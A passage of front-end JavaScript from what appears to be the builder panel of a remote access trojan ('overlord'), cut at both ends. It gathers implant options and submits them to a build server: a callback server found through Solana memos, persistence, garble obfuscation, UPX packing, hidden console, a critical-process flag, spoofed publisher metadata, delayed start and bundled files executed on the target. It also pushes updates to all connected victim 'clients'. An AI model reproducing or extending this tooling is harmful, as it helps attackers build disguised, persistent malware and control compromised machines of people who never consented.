      alert(`Each bound file must be under 50 MB. "${file.name}" is too large.`);
      return;
    }
    const safeName = sanitizeBindName(file.name);
    if (boundFiles.some((f) => f.name === safeName)) {
      alert(`A file named "${safeName}" is already in the list.`);
      return;
    }

    const reader = new FileReader();
    reader.onload = () => {
      const base64 = reader.result.split(",")[1];
      boundFiles.push({ name: safeName, base64, targetOS: [], execute: true });
      renderBoundFiles();
      updateBindAddVisibility();
    };
    reader.readAsDataURL(file);
  });
}

async function init() {
  try {
    updateServerUrlPlaceholder();
    const res = await fetch("/api/auth/me", {
      credentials: "include",
    });

    if (!res.ok) {
      window.location.href = "/";
      return;
    }

    const data = await res.json();
    currentUserRole = data.role;
    usernameDisplay.textContent = data.username;

    const roleBadges = {
      admin: '<i class="fa-solid fa-crown mr-1"></i>Admin',
      operator: '<i class="fa-solid fa-sliders mr-1"></i>Operator',
      viewer: '<i class="fa-solid fa-eye mr-1"></i>Viewer',
    };
    if (roleBadges[data.role]) {
      roleBadge.innerHTML = roleBadges[data.role];
    } else {
      roleBadge.textContent = data.role || "";
    }

    if (data.role === "admin") {
      roleBadge.classList.add(
        "bg-purple-900/50",
        "text-purple-300",
        "border",
        "border-purple-800",
      );
    } else if (data.role === "operator") {
      roleBadge.classList.add(
        "bg-blue-900/50",
        "text-blue-300",
        "border",
        "border-blue-800",
      );
    } else {
      roleBadge.classList.add(
        "bg-slate-700",
        "text-slate-300",
        "border",
        "border-slate-600",
      );
    }
    if (data.role === "admin") {
      usersLink.classList.remove("hidden");
      pluginsLink?.classList.remove("hidden");
      document.getElementById("deploy-link")?.classList.remove("hidden");
    }

    if (data.role === "admin" || data.role === "operator" || data.canBuild) {
      buildLink?.classList.remove("hidden");
    }

    if (data.role !== "viewer") {
      scriptsLink?.classList.remove("hidden");
    }

    if (data.role !== "admin" && data.role !== "operator" && !data.canBuild) {
      buildBtn.disabled = true;
      buildBtn.innerHTML =
        '<i class="fa-solid fa-lock"></i> <span>Build requires permission</span>';
    }

    await loadServerVersion();
    await loadSavedBuilds();

    const toggleAllBuildsBtn = document.getElementById("toggle-all-builds-btn");
    const toggleAllBuildsLabel = document.getElementById("toggle-all-builds-label");
    if (toggleAllBuildsBtn && currentUserRole === "admin") {
      toggleAllBuildsBtn.classList.remove("hidden");
      toggleAllBuildsBtn.addEventListener("click", async () => {
        showAllBuilds = !showAllBuilds;
        if (toggleAllBuildsLabel) {
          toggleAllBuildsLabel.textContent = showAllBuilds ? "My Builds" : "Show All";
        }
        buildFilesDiv.innerHTML = "";
        await loadSavedBuilds();
      });
    }
  } catch (err) {
    console.error("Failed to fetch user info:", err);
    window.location.href = "/";
  }
}

if (logoutBtn && !logoutBtn.dataset.boundLogout) {
  logoutBtn.dataset.boundLogout = "true";
  logoutBtn.addEventListener("click", async () => {
    try {
      await fetch("/api/logout", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
      });
    } catch (err) {
      console.error("Logout error:", err);
    }
    window.location.href = "/";
  });
}

form?.addEventListener("submit", async (e) => {
  e.preventDefault();

  if (isBuilding) return;

  const platformCheckboxes = form.querySelectorAll(
    'input[name="platform"]:checked',
  );
  const platforms = Array.from(platformCheckboxes).map((cb) => cb.value);

  if (platforms.length === 0) {
    alert("Please select at least one platform to build");
    return;
  }

  if (!validateStartupName()) {
    document.getElementById("startup-name")?.focus();
    return;
  }

  const serverUrl = form.querySelector("#server-url").value.trim();
  const rawServerList = form.querySelector("#raw-server-list")?.checked || false;
  const mutex = form.querySelector("#mutex")?.value.trim() || "";
  const disableMutex = form.querySelector('input[name="disable-mutex"]')?.checked || false;
  const stripDebug = form.querySelector('input[name="strip-debug"]').checked;
  const disableCgo = form.querySelector('input[name="disable-cgo"]').checked;
  const obfuscate = form.querySelector('input[name="obfuscate"]').checked;
  const enablePersistence = form.querySelector(
    'input[name="enable-persistence"]',
  ).checked;
  const hasWindowsTarget = platforms.some((platform) => platform.startsWith("windows-"));
  const hasPersistentUnixTarget = platforms.some((p) => p.startsWith("linux-") || p.startsWith("darwin-"));
  const persistenceMethods = hasWindowsTarget
    ? Array.from(form.querySelectorAll('input[name="persistence-method"]:checked')).map((el) => el.value)
    : undefined;
  const startupNameVal = (hasWindowsTarget || hasPersistentUnixTarget)
    ? (form.querySelector("#startup-name")?.value.trim() || "")
    : "";
  const hideConsole = form.querySelector(
    'input[name="hide-console"]',
  ).checked;
  const noPrinting = form.querySelector(
    'input[name="no-printing"]',
  ).checked;

  const outputNameVal = form.querySelector("#output-name")?.value.trim() || "";
  const garbleLiterals = form.querySelector('input[name="garble-literals"]')?.checked || false;
  const garbleTiny = form.querySelector('input[name="garble-tiny"]')?.checked || false;
  const garbleSeedVal = form.querySelector("#garble-seed")?.value.trim() || "";
  const assemblyTitle = form.querySelector("#assembly-title")?.value.trim() || "";
  const assemblyProduct = form.querySelector("#assembly-product")?.value.trim() || "";
  const assemblyCompany = form.querySelector("#assembly-company")?.value.trim() || "";
  const assemblyVersion = form.querySelector("#assembly-version")?.value.trim() || "";
  const assemblyCopyright = form.querySelector("#assembly-copyright")?.value.trim() || "";
  const requireAdmin = form.querySelector('input[name="require-admin"]')?.checked || false;
  const criticalProcess = form.querySelector('input[name="critical-process"]')?.checked || false;
  const outputExtension = form.querySelector("#output-extension")?.value || ".exe";
  const sleepSecondsRaw = parseInt(form.querySelector("#sleep-seconds")?.value || "0", 10);
  const sleepSeconds = !isNaN(sleepSecondsRaw) && sleepSecondsRaw > 0 ? sleepSecondsRaw : 0;

  const buildConfig = {
    platforms,
    serverUrl: serverUrl || undefined,
    rawServerList,
    solMemo: document.getElementById("sol-memo")?.checked || false,
    solAddress: document.getElementById("sol-address")?.value.trim() || undefined,
    solRpcEndpoints: document.getElementById("sol-rpc-endpoints")?.value.trim() || undefined,
    mutex: disableMutex ? "" : mutex || undefined,
    disableMutex,
    stripDebug,
    disableCgo,
    obfuscate,
    enablePersistence,
    persistenceMethods: enablePersistence && hasWindowsTarget ? (persistenceMethods && persistenceMethods.length > 0 ? persistenceMethods : ['startup']) : undefined,
    startupName: enablePersistence && (hasWindowsTarget || hasPersistentUnixTarget) && startupNameVal ? startupNameVal : undefined,
    hideConsole,
    noPrinting,
    outputName: outputNameVal || undefined,
    garbleLiterals: obfuscate ? garbleLiterals : undefined,
    garbleTiny: obfuscate ? garbleTiny : undefined,
    garbleSeed: obfuscate && garbleSeedVal ? garbleSeedVal : undefined,
    assemblyTitle: assemblyTitle || undefined,
    assemblyProduct: assemblyProduct || undefined,
    assemblyCompany: assemblyCompany || undefined,
    assemblyVersion: assemblyVersion || undefined,
    assemblyCopyright: assemblyCopyright || undefined,
    requireAdmin,
    criticalProcess,
    outputExtension,
    sleepSeconds: sleepSeconds > 0 ? sleepSeconds : undefined,
    iconBase64: pendingIconBase64 || undefined,
    enableUpx: form.querySelector('input[name="enable-upx"]')?.checked || false,
    upxStripHeaders: form.querySelector('input[name="upx-strip-headers"]')?.checked || false,
    boundFiles: boundFiles.length > 0
      ? boundFiles.map((f) => ({ name: f.name, data: f.base64, targetOS: f.targetOS, execute: f.execute }))
      : undefined,
  };

  const hasAndroid = platforms.some(p => p.startsWith('android-'));
  const hasBsd = platforms.some(
    p => p.startsWith('freebsd-') || p.startsWith('openbsd-'),
  );

  if (hasAndroid || hasBsd) {
    let warningText = 'WARNING: Some selected targets are severely untested and will probably not work right.\n\n';

    if (hasAndroid) {
      warningText += '- Android targets are severely untested and will probably not work right.\n';
    }

    if (hasBsd) {
      warningText += '- BSD targets are severely untested and will probably not work right.\n';
    }

    warningText += '\nContinue with build anyway?';

    if (!confirm(warningText)) {
      return;
    }
  }

  if (hasAndroid && enablePersistence) {
    if (!confirm(
      '⚠️ WARNING: Persistence is NOT supported on Android\n\n' +
      'The persistence setting will be ignored for Android builds.\n' +
      'Persistence is only supported on: Windows, Linux, and macOS\n\n' +
      'Continue with build anyway?'
    )) {
      return;
    }
  }

  await startBuild(buildConfig);
});

async function startBuild(config) {
  isBuilding = true;
  buildBtn.disabled = true;
  buildBtn.innerHTML =
    '<i class="fa-solid fa-spinner fa-spin"></i> <span>Building...</span>';
  if (buildUpdateAllBtn) {
    buildUpdateAllBtn.disabled = true;
    buildUpdateAllBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> <span>Building...</span>';
  }

  buildStatus.classList.remove("hidden");
  buildStatusText.textContent = "Starting build...";
  buildResults.classList.add("hidden");
  buildFilesDiv.innerHTML = "";

  buildOutputDiv.innerHTML = "";
  addBuildOutput("Starting build process...\n", "info");

  try {
    const res = await fetch("/api/build/start", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      credentials: "include",
      body: JSON.stringify(config),
    });

    if (!res.ok) {
      const error = await res.json();
      throw new Error(error.error || "Build failed to start");
    }

    const data = await res.json();
    const buildId = data.buildId;

    addBuildOutput(`Build ID: ${buildId}\n`, "info");
    addBuildOutput(
      `Building for platforms: ${config.platforms.join(", ")}\n\n`,
      "info",
    );

    await streamBuildOutput(buildId, config);
  } catch (err) {
    addBuildOutput(`\nERROR: ${err.message}\n`, "error");
    if (!config.disableCgo) {
      addBuildOutput(
        "Hint: This build used CGO. If it keeps failing, try enabling the 'Disable CGO' option and build again.\n",
        "warn",
      );
    }
    buildStatusText.textContent = "Build failed";
    buildStatus.querySelector("div").className =
      "flex items-center gap-2 p-3 rounded-lg bg-red-900/40 border border-red-700/60";
    buildStatus.querySelector("i").className = "fa-solid fa-circle-xmark";
    pendingUpdateAll = false;
  } finally {
    isBuilding = false;
    buildBtn.disabled = false;
    buildBtn.innerHTML =
      '<i class="fa-solid fa-hammer"></i> <span>Start Build</span>';
    if (buildUpdateAllBtn) {
      buildUpdateAllBtn.disabled = false;
      buildUpdateAllBtn.innerHTML = '<i class="fa-solid fa-arrow-up-from-bracket"></i> <span>Build & Update All</span>';
    }
  }
}

async function checkBuildInfo(buildId) {
  try {
    const res = await fetch(`/api/build/${buildId}/info`, { credentials: "include" });
    if (!res.ok) return null;
    return await res.json();
  } catch {
    return null;
  }
}

async function streamBuildOutput(buildId, config = {}) {
  const MAX_RECONNECT_ATTEMPTS = 10;
  const RECONNECT_DELAY_MS = 2000;
  let attempts = 0;
  let completed = false;

  while (!completed && attempts <= MAX_RECONNECT_ATTEMPTS) {
    if (attempts > 0) {
      addBuildOutput(`\nReconnecting to build stream (attempt ${attempts}/${MAX_RECONNECT_ATTEMPTS})...\n`, "warn");
      buildStatusText.textContent = "Reconnecting to build stream...";
      await new Promise((r) => setTimeout(r, RECONNECT_DELAY_MS));

      const info = await checkBuildInfo(buildId);
      if (info && (info.status === "completed" || info.status === "success")) {
        buildStatusText.textContent = "Build completed successfully!";
        buildStatus.querySelector("div").className =
          "flex items-center gap-2 p-3 rounded-lg bg-green-900/40 border border-green-700/60";
        buildStatus.querySelector("i").className = "fa-solid fa-circle-check";
        addBuildOutput("\nBuild completed while reconnecting.\n", "success");

        if (info.files && info.files.length > 0) {
          const buildData = {
            id: info.id || buildId,
            status: "success",
            startTime: info.startTime || Date.now(),
            expiresAt: info.expiresAt,
            files: info.files,
          };
          saveBuildToStorage(buildData.id, buildData);
          buildResults.classList.remove("hidden");
          displayBuild(buildData);

          if (pendingUpdateAll) {
            pendingUpdateAll = false;
            await pushUpdateToAllClients(buildData.id, pendingUpdateHideWindow);
          }
        }
        return;
      } else if (info && info.status === "failed") {
        buildStatusText.textContent = "Build failed";
        buildStatus.querySelector("div").className =
          "flex items-center gap-2 p-3 rounded-lg bg-red-900/40 border border-red-700/60";
        buildStatus.querySelector("i").className = "fa-solid fa-circle-xmark";
        addBuildOutput("\nBuild failed while reconnecting.\n", "error");
        return;
      }
      // status is still "running", reconnect to stream
    }

    let res;
    try {
      res = await fetch(`/api/build/${buildId}/stream`, { credentials: "include" });
    } catch (err) {
      attempts++;
      continue;
    }

    if (!res.ok) {
      if (attempts > 0) {
        const info = await checkBuildInfo(buildId);
        if (info && (info.status === "completed" || info.status === "success")) {
          buildStatusText.textContent = "Build completed successfully!";
          buildStatus.querySelector("div").className =
            "flex items-center gap-2 p-3 rounded-lg bg-green-900/40 border border-green-700/60";
          buildStatus.querySelector("i").className = "fa-solid fa-circle-check";
          if (info.files && info.files.length > 0) {
            const buildData = {
              id: info.id || buildId,
              status: "success",
              startTime: info.startTime || Date.now(),
              expiresAt: info.expiresAt,
              files: info.files,
            };
            saveBuildToStorage(buildData.id, buildData);
            buildResults.classList.remove("hidden");
            displayBuild(buildData);
          }
          return;
        }
      }
      throw new Error("Failed to connect to build stream");
    }

    const reader = res.body.getReader();
    const decoder = new TextDecoder();
    let buffer = "";

    try {
      while (true) {
        const { done, value } = await reader.read();

        if (done) break;

        buffer += decoder.decode(value, { stream: true });

        const lines = buffer.split("\n");
        buffer = lines.pop();

        for (const line of lines) {
          if (!line.trim()) continue;

          if (line.startsWith("data: ")) {
            const data = JSON.parse(line.substring(6));

            if (data.type === "output") {
              addBuildOutput(data.text, data.level || "info");
            } else if (data.type === "status") {
              buildStatusText.textContent = data.text;
            } else if (data.type === "complete") {
              buildStatusText.textContent = data.success
                ? "Build completed successfully!"
                : "Build failed";
              buildStatus.querySelector("div").className = data.success
                ? "flex items-center gap-2 p-3 rounded-lg bg-green-900/40 border border-green-700/60"
                : "flex items-center gap-2 p-3 rounded-lg bg-red-900/40 border border-red-700/60";
              buildStatus.querySelector("i").className = data.success
                ? "fa-solid fa-circle-check"
                : "fa-solid fa-circle-xmark";

              if (!data.success && !config.disableCgo) {
                addBuildOutput(
                  "Hint: This build used CGO. If it keeps failing, try enabling the 'Disable CGO' option and build again.\n",
                  "warn",
                );
              }

              if (data.success && data.files) {
                const buildData = {
                  id: data.buildId,
                  status: "success",
                  startTime: Date.now(),
                  expiresAt: data.expiresAt,
                  files: data.files,
                };
                saveBuildToStorage(data.buildId, buildData);

                buildResults.classList.remove("hidden");
                displayBuild(buildData);

                // Auto-push update if "Build & Update All" was used
                if (pendingUpdateAll) {
                  pendingUpdateAll = false;
                  await pushUpdateToAllClients(data.buildId, pendingUpdateHideWindow);
                }
              }

              reader.cancel();
              completed = true;
              return;
            } else if (data.type === "error") {
              addBuildOutput(`\nERROR: ${data.error}\n`, "error");
            }
          }
        }

        buildOutputContainer.scrollTop = buildOutputContainer.scrollHeight;
      }
      // Stream ended cleanly without a "complete" event — build may still be running
      completed = true;
    } catch (streamErr) {
      // Network error — try to reconnect
      try { reader.releaseLock(); } catch {}
      attempts++;
      continue;
    } finally {
      try { reader.releaseLock(); } catch {}
    }
  }

  if (!completed && attempts > MAX_RECONNECT_ATTEMPTS) {
    const info = await checkBuildInfo(buildId);
    if (info && (info.status === "completed" || info.status === "success")) {
      buildStatusText.textContent = "Build completed successfully!";
      buildStatus.querySelector("div").className =
        "flex items-center gap-2 p-3 rounded-lg bg-green-900/40 border border-green-700/60";
      buildStatus.querySelector("i").className = "fa-solid fa-circle-check";
      addBuildOutput("\nBuild completed (recovered after stream loss).\n", "success");
      if (info.files && info.files.length > 0) {
        const buildData = {
          id: info.id || buildId,
          status: "success",
          startTime: info.startTime || Date.now(),
          expiresAt: info.expiresAt,
          files: info.files,
        };
        saveBuildToStorage(buildData.id, buildData);
        buildResults.classList.remove("hidden");
        displayBuild(buildData);
      }
    } else {
      addBuildOutput("\nLost connection to build stream. The build may still be running on the server.\n", "warn");
      addBuildOutput("Refresh the page to check build results.\n", "warn");
    }
  }
}

function addBuildOutput(text, level = "info") {
  const span = document.createElement("span");
  span.textContent = text;

  if (level === "error") {
    span.className = "text-red-400";
  } else if (level === "success") {
    span.className = "text-green-400";
  } else if (level === "warn") {
    span.className = "text-yellow-400";
  } else {
    span.className = "text-slate-300";
  }

  buildOutputDiv.appendChild(span);
}

function showBuildFiles(files, buildId, expiresAt) {
  buildResults.classList.remove("hidden");
  buildFilesDiv.innerHTML = "";

  const buildInfoDiv = document.createElement("div");
  buildInfoDiv.className =
    "mb-3 p-3 bg-slate-900/70 border border-slate-700 rounded-lg";
  const infoRow = document.createElement("div");
  infoRow.className = "flex items-center justify-between gap-2 text-sm";
  const left = document.createElement("div");
  left.className = "flex items-center gap-2";
  const idIcon = document.createElement("i");
  idIcon.className = "fa-solid fa-fingerprint text-slate-400";
  const idLabel = document.createElement("span");
  idLabel.className = "text-slate-300";
  idLabel.textContent = "Build ID:";
  const idCode = document.createElement("code");
  idCode.className = "text-blue-400 font-mono";
  idCode.textContent = buildId;
  left.appendChild(idIcon);
  left.appendChild(idLabel);
  left.appendChild(idCode);

  const right = document.createElement("div");
  right.className = "flex items-center gap-2";
  const clockIcon = document.createElement("i");
  clockIcon.className = "fa-solid fa-clock text-slate-400";
  const expiresLabel = document.createElement("span");
  expiresLabel.className = "text-slate-300";
  expiresLabel.textContent = "Expires in:";
  const timer = document.createElement("span");
  timer.id = "expiration-timer";
  timer.className = "text-yellow-400 font-medium";
  timer.dataset.expires = String(expiresAt);
  timer.textContent = "Calculating...";
  right.appendChild(clockIcon);
  right.appendChild(expiresLabel);
  right.appendChild(timer);

  infoRow.appendChild(left);
  infoRow.appendChild(right);
  buildInfoDiv.appendChild(infoRow);
  buildFilesDiv.appendChild(buildInfoDiv);

  updateExpirationTimer();
  setInterval(updateExpirationTimer, 60000);

  files.forEach((file) => {
    const fileDiv = document.createElement("div");
    fileDiv.className =
      "flex items-center justify-between gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg";

    const fileInfo = document.createElement("div");
    fileInfo.className = "flex items-center gap-2";
    const fileIcon = document.createElement("i");
    fileIcon.className = "fa-solid fa-file-code text-blue-400";
    const fileName = document.createElement("span");
    fileName.className = "font-medium";
    fileName.textContent = file.name;
    const fileSize = document.createElement("span");
    fileSize.className = "text-xs text-slate-500";
    fileSize.textContent = formatFileSize(file.size);
    fileInfo.appendChild(fileIcon);
    fileInfo.appendChild(fileName);
    fileInfo.appendChild(fileSize);

    const downloadBtn = document.createElement("a");
    downloadBtn.href = `/api/build/download/${encodeURIComponent(file.name)}`;
    downloadBtn.className =
      "inline-flex items-center gap-1 px-3 py-1 rounded bg-blue-600 hover:bg-blue-700 text-white text-sm transition-colors";
    downloadBtn.innerHTML = '<i class="fa-solid fa-download"></i> Download';

    fileDiv.appendChild(fileInfo);
    fileDiv.appendChild(downloadBtn);
    buildFilesDiv.appendChild(fileDiv);
  });
}

function updateExpirationTimer(timerEl, expiresAt) {
  if (!timerEl) return;

  const now = Date.now();
  const remaining = expiresAt - now;

  if (remaining <= 0) {
    timerEl.textContent = "Expired";
    timerEl.className = "text-red-400 font-medium";
    return;
  }

  const days = Math.floor(remaining / (1000 * 60 * 60 * 24));
  const hours = Math.floor(
    (remaining % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60),
  );
  const minutes = Math.floor((remaining % (1000 * 60 * 60)) / (1000 * 60));

  if (days > 0) {
    timerEl.textContent = `${days}d ${hours}h`;
  } else if (hours > 0) {
    timerEl.textContent = `${hours}h ${minutes}m`;
  } else {
    timerEl.textContent = `${minutes}m`;
  }

  if (days >= 3) {
    timerEl.className = "text-green-400 font-medium";
  } else if (days >= 1) {
    timerEl.className = "text-yellow-400 font-medium";
  } else {
    timerEl.className = "text-orange-400 font-medium";
  }
}

async function deleteBuild(buildId) {
  if (!confirm("Are you sure you want to delete this build?")) {
    return;
  }

  try {
    const res = await fetch(`/api/build/${encodeURIComponent(buildId)}/delete`, {
      method: "DELETE",
      credentials: "include",
    });

    if (!res.ok) {
      const data = await res.json().catch(() => ({}));
      throw new Error(data.error || "Failed to delete build");
    }

    const buildElement = document.getElementById(`build-${buildId}`);
    if (buildElement) {
      buildElement.remove();
    }

    removeBuildFromStorage(buildId);

    if (buildFilesDiv.children.length === 0) {
      buildResults.classList.add("hidden");
    }
  } catch (err) {
    console.error("Failed to delete build:", err);
    alert("Failed to delete build. Please try again.");
  }
}

function formatFileSize(bytes) {
  if (bytes === 0) return "0 B";
  const k = 1024;
  const sizes = ["B", "KB", "MB", "GB"];
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  return Math.round((bytes / Math.pow(k, i)) * 100) / 100 + " " + sizes[i];
}

function formatStubVersion(version) {
  if (typeof version === "string" && version.trim()) {
    return version.trim();
  }
  return "unknown (legacy build)";
}

function isVersionMismatch(versionValue) {
  if (!currentServerVersion) return false;
  return versionValue !== currentServerVersion;
}

function saveBuildToStorage(buildId, buildData) {
  try {
    const builds = JSON.parse(localStorage.getItem("overlord_builds") || "[]");
    const existingIndex = builds.findIndex((b) => b.id === buildId);

    if (existingIndex >= 0) {
      builds[existingIndex] = buildData;
    } else {
      builds.push(buildData);
    }

    if (builds.length > 20) {
      builds.splice(0, builds.length - 20);
    }

    localStorage.setItem("overlord_builds", JSON.stringify(builds));
  } catch (err) {
    console.error("Failed to save build to localStorage:", err);
  }
}

function getBuildFromStorage(buildId) {
  try {
    const builds = JSON.parse(localStorage.getItem("overlord_builds") || "[]");
    return builds.find((b) => b.id === buildId);
  } catch (err) {
    console.error("Failed to get build from localStorage:", err);
    return null;
  }
}

function getAllBuildsFromStorage() {
  try {
    const builds = JSON.parse(localStorage.getItem("overlord_builds") || "[]");

    return builds.sort((a, b) => b.startTime - a.startTime);
  } catch (err) {
    console.error("Failed to get builds from localStorage:", err);
    return [];
  }
}

function removeBuildFromStorage(buildId) {
  try {
    const builds = JSON.parse(localStorage.getItem("overlord_builds") || "[]");
    const filtered = builds.filter((b) => b.id !== buildId);
    localStorage.setItem("overlord_builds", JSON.stringify(filtered));
  } catch (err) {
    console.error("Failed to remove build from localStorage:", err);
  }
}

let showAllBuilds = false;

async function loadSavedBuilds() {
  try {
    const queryParam = showAllBuilds && currentUserRole === "admin" ? "?all=true" : "";
    const res = await fetch(`/api/build/list${queryParam}`, {
      credentials: "include",
    });

    if (!res.ok) {
      console.error("Failed to fetch builds from server");
      return;
    }

    const data = await res.json();
    const builds = data.builds || [];

    const now = Date.now();
    const validBuilds = builds.filter((build) => {
      if (build.expiresAt && build.expiresAt <= now) {
        return false;
      }
      return true;
    });

    if (validBuilds.length === 0) {
      return;
    }

    buildResults.classList.remove("hidden");

    for (const build of validBuilds) {
      displayBuild(build);

      saveBuildToStorage(build.id, build);
    }
  } catch (err) {
    console.error("Failed to load builds:", err);

    const builds = getAllBuildsFromStorage();
    const now = Date.now();
    const validBuilds = builds.filter((build) => {
      if (build.expiresAt && build.expiresAt <= now) {
        removeBuildFromStorage(build.id);
        return false;
      }
      return true;
    });

    if (validBuilds.length > 0) {
      buildResults.classList.remove("hidden");
      validBuilds.forEach((build) => displayBuild(build));
    }
  }
}

function displayBuild(build) {
  const buildContainer = document.createElement("div");
  buildContainer.className =
    "build-result-item mb-6 pb-6 border-b border-gray-700 last:border-b-0";
  buildContainer.id = `build-${build.id}`;
  const header = document.createElement("div");
  header.className = "flex items-center justify-between mb-3";

  const left = document.createElement("div");
  left.className = "flex items-center gap-3";
  const boxIcon = document.createElement("i");
  boxIcon.className = "fa-solid fa-box text-blue-400";
  const buildLabel = document.createElement("span");
  buildLabel.className = "text-gray-300 font-medium";
  buildLabel.textContent = `Build ID: ${build.id.substring(0, 8)}`;
  const sep = document.createElement("span");
  sep.className = "text-gray-500";
  sep.textContent = "•";
  const startedAt = document.createElement("span");
  startedAt.className = "text-sm text-gray-400";
  startedAt.textContent = new Date(build.startTime).toLocaleString();
  left.appendChild(boxIcon);
  left.appendChild(buildLabel);
  left.appendChild(sep);
  left.appendChild(startedAt);

  const right = document.createElement("div");
  right.className = "flex items-center gap-3";
  const timerWrap = document.createElement("div");
  timerWrap.className = "flex items-center gap-2";
  const clockIcon = document.createElement("i");
  clockIcon.className = "fa-solid fa-clock text-gray-400";
  const timer = document.createElement("span");
  timer.id = `timer-${build.id}`;
  timer.className = "text-gray-300 font-medium";
  timer.textContent = "Loading...";
  timerWrap.appendChild(clockIcon);
  timerWrap.appendChild(timer);

  const deleteBtn = document.createElement("button");
  deleteBtn.id = `delete-btn-${build.id}`;
  deleteBtn.className =
    "px-3 py-1.5 bg-red-500/20 hover:bg-red-500/30 text-red-400 rounded-lg transition-colors flex items-center gap-2 text-sm";
  deleteBtn.title = "Delete build";
  const deleteIcon = document.createElement("i");
  deleteIcon.className = "fa-solid fa-trash";
  const deleteText = document.createElement("span");
  deleteText.textContent = "Delete";
  deleteBtn.appendChild(deleteIcon);
  deleteBtn.appendChild(deleteText);
  deleteBtn.addEventListener("click", () => deleteBuild(build.id));

  right.appendChild(timerWrap);
  right.appendChild(deleteBtn);

  header.appendChild(left);
  header.appendChild(right);

  const filesContainer = document.createElement("div");
  filesContainer.id = `files-${build.id}`;
  filesContainer.className = "space-y-2";

  buildContainer.appendChild(header);
  buildContainer.appendChild(filesContainer);

  buildFilesDiv.appendChild(buildContainer);

  showBuildFilesForContainer(build, `files-${build.id}`, `timer-${build.id}`);
}

function showBuildFilesForContainer(build, containerId, timerId) {
  const container = document.getElementById(containerId);
  const timerEl = document.getElementById(timerId);

  if (!container || !timerEl) return;

  build.files.forEach((file) => {
    const fileDiv = document.createElement("div");
    fileDiv.className =
      "flex items-center justify-between bg-gray-700/50 p-4 rounded-lg hover:bg-gray-700 transition-colors";

    const fileMeta = document.createElement("div");
    fileMeta.className = "flex items-center gap-3";
    const fileIcon = document.createElement("i");
    fileIcon.className = "fa-solid fa-file text-blue-400";
    const fileText = document.createElement("div");
    const fileName = document.createElement("div");
    fileName.className = "text-white font-medium";
    fileName.textContent = file.filename;
    const filePlatform = document.createElement("div");
    filePlatform.className = "text-sm text-gray-400";
    const versionValue = formatStubVersion(file.version);
    const platformText = document.createElement("span");
    platformText.textContent = `${file.platform} | `;
    const versionText = document.createElement("span");
    versionText.className = isVersionMismatch(versionValue)
      ? "server-version-number-mismatch"
      : "server-version-number";
    versionText.textContent =
      versionValue === "unknown (legacy build)" ? versionValue : `v${versionValue}`;
    filePlatform.appendChild(platformText);
    filePlatform.appendChild(versionText);
    fileText.appendChild(fileName);
    fileText.appendChild(filePlatform);
    fileMeta.appendChild(fileIcon);
    fileMeta.appendChild(fileText);

    const download = document.createElement("a");
    download.href = `/api/build/download/${encodeURIComponent(file.filename)}`;
    download.download = "";
    download.className =
      "px-4 py-2 bg-blue-500 hover:bg-blue-600 text-white rounded-lg transition-colors flex items-center gap-2";
    const downloadIcon = document.createElement("i");
    downloadIcon.className = "fa-solid fa-download";
    const downloadText = document.createElement("span");
    downloadText.textContent = "Download";
    download.appendChild(downloadIcon);
    download.appendChild(downloadText);

    fileDiv.appendChild(fileMeta);
    fileDiv.appendChild(download);

    container.appendChild(fileDiv);
  });

  if (build.expiresAt) {
    updateExpirationTimer(timerEl, build.expiresAt);

    setInterval(() => updateExpirationTimer(timerEl, build.expiresAt), 60000);
  }
}

const buildUpdateAllBtn = document.getElementById("build-update-all-btn");
const updateAllModal = document.getElementById("update-all-modal");
const updateAllModalBody = document.getElementById("update-all-modal-body");
const updateAllCancel = document.getElementById("update-all-cancel");
const updateAllConfirm = document.getElementById("update-all-confirm");

let pendingUpdateAll = false;
let pendingUpdateHideWindow = false;

function showUpdateAllModal() {
  if (!updateAllModal) return;
  updateAllModal.classList.remove("hidden");
  updateAllModal.classList.add("flex");
}

function hideUpdateAllModal() {
  if (!updateAllModal) return;
  updateAllModal.classList.remove("flex");
  updateAllModal.classList.add("hidden");
  if (updateAllConfirm) {
    updateAllConfirm.innerHTML = '<i class="fa-solid fa-hammer mr-1"></i> Build & Update';
    updateAllConfirm.disabled = false;
  }
  if (updateAllCancel) {
    updateAllCancel.textContent = "Cancel";
  }
}

if (updateAllCancel) {
  updateAllCancel.addEventListener("click", hideUpdateAllModal);
}

if (updateAllModal) {
  updateAllModal.addEventListener("click", (e) => {
    if (e.target === updateAllModal) hideUpdateAllModal();
  });
}

if (buildUpdateAllBtn) {
  buildUpdateAllBtn.addEventListener("click", async () => {
    if (isBuilding) return;

    const platformCheckboxes = form.querySelectorAll('input[name="platform"]:checked');
    const platforms = Array.from(platformCheckboxes).map((cb) => cb.value);
    if (platforms.length === 0) {
      alert("Please select at least one platform to build");
      return;
    }

    showUpdateAllModal();
    updateAllConfirm.disabled = true;
    updateAllModalBody.innerHTML = '<p class="text-slate-400"><i class="fa-solid fa-spinner fa-spin mr-2"></i>Checking online clients...</p>';

    try {
      const res = await fetch("/api/build/update-eligible", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        credentials: "include",
        body: JSON.stringify({ platforms }),
      });

      if (!res.ok) {
        const data = await res.json().catch(() => ({}));
        updateAllModalBody.innerHTML = `<p class="text-red-400"><i class="fa-solid fa-circle-xmark mr-2"></i>${data.error || "Failed to check eligible clients"}</p>`;
        return;
      }

      const data = await res.json();
      let html = "";

      html += `<p class="text-white"><i class="fa-solid fa-users mr-2 text-amber-400"></i><strong>${data.eligible}</strong> client(s) will receive the update after build.</p>`;
      html += '<div class="mt-2 text-xs text-slate-400 space-y-1">';
      html += `<p><i class="fa-solid fa-globe mr-1 text-blue-400"></i> ${data.totalOnline} total online client(s)</p>`;
      if (data.skippedInMemory > 0) {
        html += `<p><i class="fa-solid fa-memory mr-1 text-red-400"></i> ${data.skippedInMemory} client(s) will be skipped (running in-memory)</p>`;
      }
      if (data.skippedNoMatch > 0) {
        html += `<p><i class="fa-solid fa-ban mr-1 text-slate-500"></i> ${data.skippedNoMatch} client(s) will be skipped (no matching platform)</p>`;
      }
      html += "</div>";

      if (data.eligible === 0 && data.totalOnline === 0) {
        html += '<p class="mt-3 text-xs text-slate-500">No clients are currently online. The build will still run but no updates will be sent.</p>';
      }

      html += '<p class="mt-3 text-xs text-amber-300/80"><i class="fa-solid fa-triangle-exclamation mr-1"></i>This will build the client and push the update to all eligible clients. Clients will restart automatically.</p>';
      updateAllConfirm.disabled = false;

